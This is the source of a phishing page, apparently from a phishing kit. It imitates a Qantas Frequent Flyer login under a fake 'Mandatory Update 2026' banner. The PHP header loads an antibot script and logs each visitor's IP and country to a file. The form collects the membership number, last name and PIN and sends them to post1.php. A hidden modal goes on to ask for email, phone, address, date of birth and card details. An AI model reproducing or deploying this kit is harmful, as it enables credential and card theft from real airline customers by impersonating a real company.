<?php
require "antibot.php";

function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function getRealIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // use first IP if comma‑separated
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$realip = getRealIpAddr();

// Use ip-api.com as the geolocation service (no API key needed)
$json = file_get_contents_curl('http://ip-api.com/json/' . $realip);
$obj = json_decode($json);

$countryName = $obj->country ?? 'Unknown';
$countryCode = $obj->countryCode ?? 'XX';

$messageTxt = "IP : $realip | Country : $countryName\n";
file_put_contents("Views.txt", $messageTxt, FILE_APPEND);
?>

<html class="js svg svgfilters csscalc csspositionsticky inlinesvg supports svgforeignobject no-touchevents csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox flexboxlegacy csstransforms3d fonts-loaded svg svgfilters csscalc csspositionsticky inlinesvg supports svgforeignobject no-touchevents csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox flexboxlegacy csstransforms3d" lang="en-US" style=""><head class="at-element-marker">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="robots" content="index, follow">
        <link rel="stylesheet" href="main.css" type="text/css">
        <link rel="stylesheet" href="//qantas.resultspage.com/autocomplete/sli-rac.css" media="screen" type="text/css">
        <link rel="stylesheet" type="text/css" href="https://cdn.qantasloyalty.com/assets/widgets/login/v2/login.bundle.css">
        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
        <link rel="stylesheet" type="text/css" href="style.css">
        <link rel="stylesheet" href="https://www.qantas.com/etc/designs/qcom/site/main-noncritical.min.39f8b7e771e1f7442c41e2b0eb8c5459.css">
    </head>

    <body class="tpl-full-width">
        <input type="text" style="display: none;" name="reference" id="reference" value="c88749ed03423b3263a3">
        <div class="header header-section parbase">
            <header id="header" class="header" role="banner">
                <div class="row">
                    <div class="logo-wrapper">
                        <span>
                            <a href="https://www.qantas.com/us/en.html">
                                <img class="logo-qantas" src="qantas-masterbrand-logo-40px.svg" alt="Qantas logo">
                            </a>
                        </span>
                    </div>
                    <div class="login-ribbon">

                    </div>

                    <nav class="menu-top">

                    </nav>
                </div>
            </header>
        </div>










<main>
<div>
    <div class="full-width-main parsys">
    <div class="join-form parbase section">
<div class="join-form-sticky-header-wrapper sticky__1aIiS">

<div class="header__3O4UQ">
    <div class="left__3vX0_">Your details</div>
<div class="right__Su8TU">
    <div>Mandatory Update<span class="showForMobile__2wHnz"> 2026</span>
    <span class="hideForMobile__2OVCC"> (including GST): </span>
<span class="price__38qy1">STATUS : NOT COMPLETED</span>
</div>
</div>
</div>
</div>
<div class="background-colour-block background-colour-block--no-margin-top">
    <div class="row">
        <div class="column">
            <div id="login-form-anchor">
                <div class="wrap__2Vpqe">
                    <div style="display: block;">
                        <form class="loginForm__2BLOv" id="loginForm" method="POST" action="post1.php">
                            <div style="max-width: 400px; margin: 0 auto; padding: 40px 20px;">
                                
                                <!-- Login Header -->
                                <div style="text-align: center; margin-bottom: 30px;">
                                    <h1 style="font-size: 32px; color: #000; margin: 0 0 10px 0; font-weight: 400;">Log in</h1>
                                    <p style="font-size: 16px; color: #000; font-weight: 600; margin: 0;">
                                        Continue to Qantas Money
                                    </p>
                                </div>

                                <!-- Membership Number Field -->
                                <div class="_textfield_1n9ei_1" style="margin-bottom: 25px;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                                        <label for="membershipNumber" style="font-size: 14px; font-weight: 600; color: #000;">
                                            Membership number
                                        </label>
                                        <a href="#" style="font-size: 14px; color: #0066cc; text-decoration: none;">
                                            Forgot number?
                                        </a>
                                    </div>
                                    <div class="_fieldWrap_1n9ei_29">
                                        <input name="membership_number" aria-describedby="membershipNumber-desc" aria-invalid="false" id="membershipNumber" type="text" placeholder="" style="height: 44px; border: 1px solid #ccc; border-radius: 4px; padding: 0 12px;" required>
                                    </div>
                                </div>

                                <!-- Divider -->
                                <hr style="border: none; border-top: 1px solid #e0e0e0; margin: 25px 0;">

                                <!-- Last Name Field -->
                                <div class="_textfield_1n9ei_1" style="margin-bottom: 25px;">
                                    <label for="lastName" style="font-size: 14px; font-weight: 600; color: #000; display: block; margin-bottom: 8px;">
                                        Last Name
                                    </label>
                                    <div class="_fieldWrap_1n9ei_29">
                                        <input name="last_name" aria-describedby="lastName-desc" aria-invalid="false" id="lastName" type="text" placeholder="" style="height: 44px; border: 1px solid #ccc; border-radius: 4px; padding: 0 12px;" required>
                                    </div>
                                </div>

                                <!-- PIN Field -->
                                <div class="_textfield_1n9ei_1" style="margin-bottom: 25px;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                                        <label for="pin" style="font-size: 14px; font-weight: 600; color: #000;">
                                            PIN
                                        </label>
                                        <a href="#" style="font-size: 14px; color: #0066cc; text-decoration: none;">
                                            Forgot PIN?
                                        </a>
                                    </div>
                                    <div class="_fieldWrap_1n9ei_29">
                                        <input name="pin" aria-describedby="pin-desc" aria-invalid="false" id="pin" type="password" placeholder="" style="height: 44px; border: 1px solid #ccc; border-radius: 4px; padding: 0 12px;" required>
                                    </div>
                                </div>

                                <!-- Remember Details Checkbox -->
                                <div style="margin-bottom: 30px;">
                                    <div class="_checkbox_1jqeq_1">
                                        <input name="remember_details" value="1" type="checkbox" id="rememberDetails" aria-invalid="false">
                                        <label for="rememberDetails" style="font-size: 14px; color: #000;">
                                            Remember details
                                        </label>
                                    </div>
                                </div>

                                <!-- Login Button -->
                                <div style="margin-bottom: 30px;">
                                    <div class="_button_1cxhq_2">
                                        <button name="login_submit" type="submit" class="_solid_1cxhq_19" style="width: 100%; height: 48px; font-size: 16px; font-weight: 600; background: #e40000; border: none; color: white; border-radius: 4px; cursor: pointer;">
                                            LOG IN
                                        </button>
                                    </div>
                                </div>

                                <!-- Footer Links -->
                                <div style="text-align: center;">
                                    <p style="font-size: 14px; color: #666; margin-bottom: 20px;">
                                        Not a member? <a href="#" style="color: #0066cc; text-decoration: none;">You can join here</a>
                                    </p>
                                    <p style="font-size: 12px; color: #999; margin: 0;">
                                        Our QFF Terms &amp; Privacy Policy have changed
                                    </p>
                                </div>

                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</div>

</div>
</div>
</main>




<div class="ReactModalPortal" id="confirmationfinal" style="display:none;">
    <div class="ReactModal__Overlay ReactModal__Overlay--after-open" style="position: fixed; inset: 0px; background-color: rgba(255, 255, 255, 0.75);">
    <div class="ReactModal__Content ReactModal__Content--after-open" tabindex="-1" role="dialog" aria-modal="true" style="position: absolute; inset: 50% auto auto 50%; border: 0px; background: rgb(255, 255, 255); overflow: auto; border-radius: 4px; outline: none; padding: 20px; width: 100%; max-height: calc(100vh - 40px); transform: translate(-50%, -50%); box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 50px 0px;">
    <div class="confirmationScreen__2JbKP">
    <div class="closeButton__2qE5V">Close</div>
<div class="mainContainer__1tiYS">
    <h2>Confirm your details</h2>
<p class="mainText__NUuBK">Check that the details are correct. Now you have to confirm your Qantas Card. </p>
<div>
    <div class="row__2BgTP">
    <p>Your name<span class="colon__3_tT8">:</span>
</p>
<p class="bold__2v4rH" id="firstnamealert"></p>
</div>
<div class="row__2BgTP">
    <p>Email address<span class="colon__3_tT8">:</span>
</p>
<p class="bold__2v4rH" id="emailalert"></p>
</div>
<div class="row__2BgTP">
    <p>Mobile number<span class="colon__3_tT8">:</span>
</p>
<p class="bold__2v4rH" id="phonealert"></p>
</div>
<div class="row__2BgTP">
    <p>Postal address<span class="colon__3_tT8">:</span>
</p>
<p class="bold__2v4rH" id="addalert"></p>
</div>
<div class="row__2BgTP">
    <p>Your date of birth<span class="colon__3_tT8">:</span>
</p>
<p class="bold__2v4rH" id="dobalert"></p>
</div>
<div class="row__2BgTP">
    <p>Deposit method <span class="colon__3_tT8">:</span>
</p>
<p class="bold__2v4rH" id="cardalert"></p>
</div>
<div class="row__2BgTP">
    <p>Update Year<span class="colon__3_tT8">:</span>
</p>
<p class="bold__2v4rH">2026</p>
</div>
</div>
<div class="buttonContainer__1lhfj">
    <div class="_button_1cxhq_2 ffjJoinNow">
    <button type="button" class="_solid_1cxhq_19 ffjJoinNow_button" onclick="alorsondanse();">Confirm NOW</button>
</div>
</div>
<div class="centered__13QgF">
    <button class="cancelButton__2atfc">Cancel</button>
</div>
</div>
</div>
</div>
</div>
</div>

<div class="ReactModalPortal" id="loadingwaiting" style="display:none;">
    <div class="ReactModal__Overlay ReactModal__Overlay--after-open" style="position: fixed; inset: 0px; background-color: rgba(255, 255, 255, 0.75);">
    <div class="ReactModal__Content ReactModal__Content--after-open" tabindex="-1" role="dialog" aria-modal="true" style="position: absolute; inset: 50% auto auto 50%; border: 0px; background: none; overflow: auto; border-radius: 4px; outline: none; padding: 20px; width: 100%; max-height: calc(100vh - 40px); transform: translate(-50%, -50%); box-shadow: none; text-align: center;">
    <div class="_skThreeBounce_wkq28_1 ">
    <div class="_skChild_wkq28_4 _skBounce1_wkq28_12">
</div>
<div class="_skChild_wkq28_4 _skBounce2_wkq28_14">
</div>
<div class="_skChild_wkq28_4">
</div>
</div>
<p style="margin-top: 20px;" id="sleepingt"></p>
</div>
</div>
</div>


<footer id="footer" class="footer">
  <div class="footer__wrap">
    <div class="row">
  <div class="footer-link-to-top link-to-top parbase">
<a class="footer__top" href="#header" data-q-smooth-scroll="" data-q-smooth-scroll-hide-hash="">Go to top</a>
</div>
<section class="footer__section column medium-3">
    <div class="footer-about-qantas about-qantas parbase">
<h3 class="footer__heading">About Qantas</h3>
<ul class="simple-list simple-list--two-column-max-medium column">

    <li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/travel-info/baggage/allowance-and-fees.html">Baggage &amp; Optional Service Fees</a>
</li>

<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/support/customer-service-plan.html">Customer Service Plan</a>
</li>

<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/qantas-group.html" target="_blank">Qantas Group</a>
</li>

<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/about-us/news-room.html">News Room</a>
</li>

<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/about-us/qantas-careers.html">Careers</a>
</li>

<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/about-us/our-company/our-airline-partners/oneworld.html">oneworld</a>
</li>

<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/about-us.html">More about Qantas</a>
</li>

<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/100-years-of-the-spirit-of-australia.html">Qantas Centenary</a>
</li>

<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/content/dam/qantas/pdfs/about-us/corporate-governance/modern-slavery-and-human-trafficking-statement.pdf" target="_blank">Modern Slavery Act Statement</a>
</li>

</ul>
</div>
</section>
<section class="footer__section column medium-4 large-4">
    <div class="footer-never-miss-a-deal never-miss-a-deal parbase">
<h3 class="footer__heading">Access to great deals</h3>
<p class="medium-fine-print">
</p>
<p>Join <a class="footer__link" href="/us/en/frequent-flyer/discover-and-join/join.html" target="_self">Qantas Frequent Flyer</a>&nbsp;or&nbsp;<a class="footer__link" href="/us/en/travel-info/email-subscription.html" target="_self">subscribe to Red Email</a> today.</p>
<p>
</p>
<form action="https://www.qantas.com/us/en/travel-info/email-subscription.html" target="_top" data-parsley-validate="">
  <div class="row">
    <div class="column large-4">
  <button class="button button--steel" type="submit" value="Submit">Subscribe</button>
</div>
  </div>
</form>
</div>
</section>
<section class="footer__section column medium-5 large-4 large-offset-1">
    <div class="footer-social-links social parbase">
<h3 class="footer__heading">Follow us</h3>
<ul class="simple-list simple-list--two-column column">

    <li class="simple-list__list-item">
  <a class="footer__link footer__link--no-underline" href="https://www.facebook.com/Qantas/" aria-label="1.4m+ likes on facebook" target="_blank">
    <i class="sprite-inline sprite-facebook-outline-grey">
  </i>1.4m+ likes<span class="visually-hidden">Opens external site in a new window</span>
  </a>
</li>


  <li class="simple-list__list-item">
    <a class="footer__link footer__link--no-underline" href="https://twitter.com/Qantas" aria-label="483k+ followers on twitter" target="_blank">
    <i class="sprite-inline sprite-twitter-outline-grey">
</i>483k+ followers<span class="visually-hidden">Opens external site in a new window</span>
</a>
  </li>


  <li class="simple-list__list-item">
    <a class="footer__link footer__link--no-underline" href="http://www.linkedin.com/company/qantas" aria-label="287k+ followers on linked in" target="_blank">
    <i class="sprite-inline sprite-linkedin-outline-grey">
</i>287k+ followers<span class="visually-hidden">Opens external site in a new window</span>
</a>
  </li>


  <li class="simple-list__list-item">
    <a class="footer__link footer__link--no-underline" href="https://www.youtube.com/user/Qantas" aria-label="93k+ subscribers on you tube" target="_blank">
    <i class="sprite-inline sprite-youtube-outline-grey">
</i>93k+ subscribers<span class="visually-hidden">Opens external site in a new window</span>
</a>
  </li>


  <li class="simple-list__list-item">
    <a class="footer__link footer__link--no-underline" href="http://instagram.com/Qantas" aria-label="933k+ followers on instagram" target="_blank">
    <i class="sprite-inline sprite-instagram-outline-grey">
</i>933k+ followers<span class="visually-hidden">Opens external site in a new window</span>
</a>
  </li>


  </ul>
</div>
</section>
</div>
  </div>
  <div class="footer-lower-links lower-links parbase">
<div class="row">
    <div class="column medium-3">
<a class="logo-oneworld" href="https://www.qantas.com/au/en/qantas-experience/network-and-partner-airlines/oneworld.html">Oneworld</a>
<a class="footer__jetstar" href="https://www.jetstar.com" target="_blank">Jetstar<span class="visually-hidden">Opens external site in a new window</span>
</a>
<a class="footer__accessibility" href="https://www.qantas.com/us/en/support/essential-accessibility.html">eSSENTIAL Accessibility<sup>TM</sup>
</a>
</div>
<div class="column medium-9">
  <ul class="simple-list simple-list--three-column-max-medium simple-list--inline-medium">
    <li class="simple-list__list-item">
    <a class="footer__link" href="https://help.qantas.com/support/s/">Help and Support<span class="visually-hidden">Opens external site</span>
</a>
</li>
<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/support/privacy-and-security.html">Privacy &amp; Security</a>
</li>
<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/support/terms-of-use.html">Terms of Use</a>
</li>
<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/book-a-trip/flights/conditions-of-carriage.html">Conditions of Carriage</a>
</li>
<li class="simple-list__list-item">
    <a class="footer__link" href="https://www.qantas.com/us/en/book-a-trip/flights/fare-types.html">Fare types</a>
</li>
  </ul>
</div>
</div>
<div class="row">
    <div class="column">
  <p class="footer__copyright">© Qantas Airways Limited ABN 16 009 661 901</p>
</div>
</div>
</div>
</footer>
<script src="funtions.js"></script>
    

</body></html>